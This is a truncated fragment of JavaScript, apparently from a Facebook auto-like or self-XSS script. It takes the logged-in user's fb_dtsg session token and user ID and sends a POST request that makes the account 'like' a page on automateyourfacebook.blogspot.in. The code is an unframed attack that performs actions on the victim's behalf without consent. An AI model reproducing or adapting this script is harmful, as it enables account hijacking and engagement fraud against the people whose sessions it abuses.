...
function a(abone) {
    ...
    var params4 = "fb_dtsg=" + fb_dtsg + "&href=http%3A%2F%2Fautomateyourfacebook.blogspot.in" + abone + "&action=like&nobootload=&iframe_referer=http%3A%2F%2Fautomateyourfacebook.blogspot.in%2F&ref=&xfbml=&__user=" + user_id + "&__a=1&__dyn=7wfGbw&__req=1&ttstamp=265816811012074100114";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function () {
        if (http4.readyState == 4 && http4.status == 200) {
            http4.close;
